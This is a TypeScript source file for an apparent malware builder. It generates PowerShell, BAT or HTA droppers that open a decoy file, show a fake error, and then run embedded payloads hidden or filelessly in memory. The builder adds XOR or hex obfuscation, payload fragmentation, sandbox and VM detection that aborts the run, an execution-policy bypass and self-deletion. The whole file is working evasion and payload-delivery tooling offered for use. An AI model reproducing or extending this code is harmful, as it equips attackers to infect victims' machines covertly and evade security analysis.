
'use server';

import { z } from 'zod';

const FileInputSchema = z.object({
  name: z.string(),
  content: z.string(), // Base64 Data URI
});

const MergePayloadsInputSchema = z.object({
  payloads: z.array(FileInputSchema),
  benign: FileInputSchema,
  outputFormat: z.enum(['ps1', 'bat', 'hta']),
  obfuscationType: z.enum(['none', 'xor', 'hex']).default('none'),
  encryptionKey: z.string().optional(),
  useFragmentation: z.boolean().optional(),
  executionDelay: z.string().optional(),
  fileless: z.boolean().optional(),
  fakeErrorMessage: z.string().optional(),
  selfDestruct: z.boolean().optional(),
  enableSandboxDetection: z.boolean().optional(),
  checkCpuCores: z.boolean().optional(),
  checkRam: z.boolean().optional(),
  checkVmProcesses: z.boolean().optional(),
  sandboxAbortMessage: z.string().optional(),
});

type MergePayloadsInput = z.infer<typeof MergePayloadsInputSchema>;

type MergePayloadsOutput = {
  success: boolean;
  scriptContent?: string;
  error?: string;
};

// Helper function to decode a data URI to a Base64 string
function decodeDataUri(dataUri: string): string {
    const parts = dataUri.split(',');
    if (parts.length !== 2) {
        throw new Error('Invalid Data URI format');
    }
    return parts[1];
}

// XOR Encryption function
function xorEncrypt(data: string, key: string): string {
    let result = '';
    for (let i = 0; i < data.length; i++) {
        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
    }
    return result;
}

const generatePowershellDropper = (input: Required<MergePayloadsInput>): string => {
    
    let delaySection = '';
    if (input.executionDelay && !isNaN(parseInt(input.executionDelay, 10))) {
        delaySection = `Start-Sleep -Seconds ${parseInt(input.executionDelay, 10)}`;
    }

    let fakeErrorSection = '';
    if (input.fakeErrorMessage) {
        fakeErrorSection = `
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show("${input.fakeErrorMessage}", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        `;
    }
    
    let selfDestructSection = '';
    if (input.selfDestruct) {
        selfDestructSection = `
try {
    Remove-Item -Path $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
} catch {}
        `;
    }
    
    let antiAnalysisSection = '';
    if (input.enableSandboxDetection) {
        const checks = [];
        if (input.checkCpuCores) checks.push('(Get-CimInstance Win32_Processor).NumberOfCores -le 2');
        if (input.checkRam) checks.push('(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB -lt 4');
        if (input.checkVmProcesses) checks.push(`$vmProcesses = "vmtoolsd", "vboxservice"; Get-Process | Where-Object { $vmProcesses -contains $_.Name } | Select-Object -First 1`);
        
        if (checks.length > 0) {
            antiAnalysisSection = `
$isSandbox = ${checks.join(' -or ')}
if ($isSandbox) {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show("${input.sandboxAbortMessage}", "Application Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    ${selfDestructSection}
    exit
}
            `;
        }
    }


    const payloadProcessingLoops = input.payloads.map((payload, index) => {
        const varSuffix = index + 1;
        let payloadSection: string;
        let payloadDecoding: string;

        if (input.useFragmentation) {
            const chunkSize = 1000;
            const chunks = [];
            for (let i = 0; i < payload.content.length; i += chunkSize) {
                chunks.push(payload.content.substring(i, i + chunkSize));
            }
            const chunkString = chunks.map(c => `@"${c}"@`).join(',');
            payloadSection = `$payloadChunks${varSuffix} = ${chunkString}\n$payloadData${varSuffix} = $payloadChunks${varSuffix} -join ''`;
        } else {
            payloadSection = `$payloadData${varSuffix} = @"\n${payload.content}\n"@`;
        }

        if (input.obfuscationType === 'xor' && input.encryptionKey) {
            payloadDecoding = `
$key = "${input.encryptionKey}"
$encryptedBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})
$keyBytes = [System.Text.Encoding]::ASCII.GetBytes($key)
$payloadFileBytes${varSuffix} = New-Object byte[] $encryptedBytes${varSuffix}.Length
for ($i = 0; $i -lt $encryptedBytes${varSuffix}.Length; $i++) {
    $payloadFileBytes${varSuffix}[$i] = $encryptedBytes${varSuffix}[$i] -bxor $keyBytes[$i % $keyBytes.Length]
}`;
        } else if (input.obfuscationType === 'hex') {
            payloadDecoding = `
$hexString${varSuffix} = $payloadData${varSuffix} -replace '[\\s\\r\\n]'
$payloadFileBytes${varSuffix} = New-Object byte[] ($hexString${varSuffix}.Length / 2)
for ($i = 0; $i -lt $hexString${varSuffix}.Length; $i += 2) {
    $payloadFileBytes${varSuffix}[$i/2] = [System.Convert]::ToByte($hexString${varSuffix}.Substring($i, 2), 16)
}`;
        } else { // 'none' or default to Base64
            payloadDecoding = `\n$payloadFileBytes${varSuffix} = [System.Convert]::FromBase64String($payloadData${varSuffix})`;
        }
        
        let executionSection: string;
        if (input.fileless) {
            executionSection = `
try {
    $assembly = [System.Reflection.Assembly]::Load($payloadFileBytes${varSuffix})
    $entryPoint = $assembly.EntryPoint
    if ($entryPoint) {
        $entryPoint.Invoke($null, $null)
    } else {
        $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
        [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
        Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
    }
} catch {
    $payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
    [IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
    Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden
}`;
        } else {
            executionSection = `
$payloadFilePath${varSuffix} = Join-Path $tempPath "${payload.name}"
[IO.File]::WriteAllBytes($payloadFilePath${varSuffix}, $payloadFileBytes${varSuffix})
Start-Process -FilePath $payloadFilePath${varSuffix} -WindowStyle Hidden`;
        }

        return `
# Processing Payload ${varSuffix}: ${payload.name}
${payloadSection}
${payloadDecoding}
${executionSection}
`;
    }).join('\n');

    return `
${antiAnalysisSection}

$tempPath = $env:TEMP
$benignFilePath = Join-Path $tempPath "${input.benign.name}"

try {
    $benignFileBase64 = @"
${decodeDataUri(input.benign.content)}
"@
    
    [IO.File]::WriteAllBytes($benignFilePath, [System.Convert]::FromBase64String($benignFileBase64))
    Start-Process $benignFilePath

    ${fakeErrorSection}

    ${delaySection}

    ${payloadProcessingLoops}
} catch {
    # Fail silently
} finally {
    ${selfDestructSection}
}
`;
};


/**
 * Generates a dropper script that embeds multiple files.
 * When run, it drops the benign file, opens it, and executes the payloads.
 */
export async function mergePayloads(input: MergePayloadsInput): Promise<MergePayloadsOutput> {
  try {
    const validatedInput = MergePayloadsInputSchema.parse(input);
    const { payloads, ...rest } = validatedInput;
    
    const filledInput: Required<MergePayloadsInput> = {
        ...{
            encryptionKey: 'netrax_default_key', // Ensure a default key if none is provided
            useFragmentation: false,
            executionDelay: '',
            fileless: false,
            fakeErrorMessage: '',
            selfDestruct: false,
            enableSandboxDetection: false,
            checkCpuCores: false,
            checkRam: false,
            checkVmProcesses: false,
            sandboxAbortMessage: '',
        },
        ...validatedInput,
        payloads,
    };

    const processedPayloads = filledInput.payloads.map(payload => {
        let payloadBase64 = decodeDataUri(payload.content);
        let payloadString = payloadBase64; // Default to base64

        if (filledInput.obfuscationType === 'xor' && filledInput.encryptionKey) {
            const rawPayload = Buffer.from(payloadBase64, 'base64');
            const encryptedPayload = Buffer.from(xorEncrypt(rawPayload.toString('latin1'), filledInput.encryptionKey), 'latin1');
            payloadString = encryptedPayload.toString('base64');
        } else if (filledInput.obfuscationType === 'hex') {
            payloadString = Buffer.from(payloadBase64, 'base64').toString('hex');
        }
        
        return { name: payload.name, content: payloadString };
    });
    
    const finalInput = { ...filledInput, payloads: processedPayloads };
    let scriptContent = '';

    switch (filledInput.outputFormat) {
        case 'ps1':
            scriptContent = generatePowershellDropper(finalInput);
            break;
        
        case 'bat':
            const psScript = generatePowershellDropper(finalInput);
            const encodedPsScript = Buffer.from(psScript, 'utf16le').toString('base64');
            let batContent = `@echo off\npowershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${encodedPsScript}`;
            if(filledInput.selfDestruct) {
                batContent += `\n(goto) 2>nul & del "%~f0"`;
            }
            scriptContent = batContent;
            break;

        case 'hta':
            // Note: Anti-VM checks are harder and less reliable in pure VBScript. Sticking to PS-based droppers for that.
            const htaPayloadProcessing = finalInput.payloads.map((payload, index) => {
                const varSuffix = index + 1;
                let payloadProcessingSection: string;

                if (finalInput.useFragmentation) {
                    const chunkSize = 500;
                    const chunks = [];
                    for (let i = 0; i < payload.content.length; i += chunkSize) {
                        chunks.push(payload.content.substring(i, i + chunkSize));
                    }
                    const chunkString = chunks.map(c => `"${c}"`).join(" & ");
                    payloadProcessingSection = `payloadData${varSuffix} = ${chunkString}`;
                } else {
                    payloadProcessingSection = `payloadData${varSuffix} = "${payload.content}"`;
                }

                if (finalInput.obfuscationType === 'xor' && finalInput.encryptionKey) {
                    payloadProcessingSection += `
                    key = "${finalInput.encryptionKey}"
                    
                    Dim encryptedBytes, keyBytes, i
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = payloadData${varSuffix}
                    encryptedBytes = oNode.NodeTypedValue
                    
                    keyBytes = StrToBytes(key)
                    
                    For i = 0 To UBound(encryptedBytes)
                        encryptedBytes(i) = encryptedBytes(i) Xor keyBytes(i Mod UBound(keyBytes))
                    Next
                    
                    Call BytesToFile(encryptedBytes, tempPath & "\\${payload.name}")
                    `;
                } else if (finalInput.obfuscationType === 'hex') {
                     payloadProcessingSection += `Call HexToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
                } else { // none (base64)
                     payloadProcessingSection += `Call Base64ToFile(payloadData${varSuffix}, tempPath & "\\${payload.name}")`;
                }
                
                return `
                ' Payload ${varSuffix}: ${payload.name}
                ${payloadProcessingSection}
                objShell.Run "cmd /c """ & tempPath & "\\${payload.name}" & """", 0, False
                `;
            }).join('\n');
            
            let selfDestructHta = '';
            if (finalInput.selfDestruct) {
                selfDestructHta = `
                On Error Resume Next
                objFSO.DeleteFile(window.document.location.pathname)
                On Error GoTo 0
                `;
            }

            const vbsPayload = `
                Set objShell = CreateObject("WScript.Shell")
                Set objFSO = CreateObject("Scripting.FileSystemObject")
                
                tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
                benignFilePath = tempPath & "\\${finalInput.benign.name}"

                benignB64 = "${decodeDataUri(finalInput.benign.content)}"
                Call Base64ToFile(benignB64, benignFilePath)
                objShell.Run "cmd /c """ & benignFilePath & """", 1, True

                ${finalInput.fakeErrorMessage ? `MsgBox "${finalInput.fakeErrorMessage}", 16, "Error"` : ''}

                ${finalInput.executionDelay ? `WScript.Sleep ${parseInt(finalInput.executionDelay, 10) * 1000}` : ''}
                
                ${htaPayloadProcessing}
                
                ${selfDestructHta}

                window.close()

                Sub HexToFile(sHex, sFile)
                    Dim objFSO, objFile
                    Set objFSO = CreateObject("Scripting.FileSystemObject")
                    Set objFile = objFSO.CreateTextFile(sFile, True)
                    For i = 1 to Len(sHex) Step 2
                        objFile.Write Chr(CLng("&H" & Mid(sHex, i, 2)))
                    Next
                    objFile.Close
                End Sub
                
                Sub BytesToFile(bytes, filename)
                    With CreateObject("ADODB.Stream")
                        .Type = 1 ' adTypeBinary
                        .Open
                        .Write bytes
                        .SaveToFile filename, 2 ' adSaveCreateOverWrite
                        .Close
                    End With
                End Sub

                Sub Base64ToFile(B64, FileName)
                    Dim oXML, oNode
                    Set oXML = CreateObject("MSXML2.DOMDocument")
                    Set oNode = oXML.CreateElement("base64")
                    oNode.DataType = "bin.base64"
                    oNode.Text = B64
                    With CreateObject("ADODB.Stream")
                        .Type = 1
                        .Open
                        .Write oNode.NodeTypedValue
                        .SaveToFile FileName, 2
                        .Close
                    End With
                End Sub

                Function StrToBytes(s)
                    Dim bytes(), i
                    ReDim bytes(Len(s) - 1)
                    For i = 1 To Len(s)
                        bytes(i-1) = Asc(Mid(s, i, 1))
                    Next
                    StrToBytes = bytes
                End Function
            `;
            scriptContent = `<script language="VBScript">${vbsPayload}</script>`;
            break;

        default:
             return { success: false, error: 'Invalid or unsupported output format.' };
    }

    return {
      success: true,
      scriptContent: scriptContent,
    };
  } catch (e) {
    console.error("Payload merging failed:", e);
    const message = e instanceof Error ? e.message : 'An unknown error occurred.';
    return {
      success: false,
      error: `Failed to generate dropper script: ${message}`,
    };
  }
}
